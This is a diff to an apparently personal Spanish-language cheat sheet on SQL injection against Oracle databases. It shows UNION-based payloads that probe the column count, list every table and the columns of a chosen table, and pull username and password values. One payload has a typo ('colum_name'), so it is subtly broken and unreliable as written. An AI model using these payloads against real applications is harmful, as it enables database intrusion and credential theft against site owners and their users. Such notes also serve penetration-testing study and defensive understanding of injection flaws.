@@ -39,8 +39,14 @@ Identificar el numero de columnas
 Una vez ya hemos identificado las columnas debemos probar con un
 `' union select 'a','b' from dual-- -` | `' union select 1,2 from dual-- -` | `' union select NULL,NULL from dual-- -`, si hubiese tres columnas seria 1,2,3 etc, hay que poner el dual pur que en Oracle siempre hay que llamar a una tabla
 
+Mostrar el contenido de todas las tablas
+`' union select NULL,table_name from all_tables-- -`
 
+Mostar información de la tabla que nos interesa
+`' union select NULL,colum_name from all_tab_columns where table_name='nombretabla'-- -`
 
+Mostrar el contenido de la tabla seleccionada
+`' union select username,password from nombretabla-- -`
 
 
 #### MySQL y MSSQL
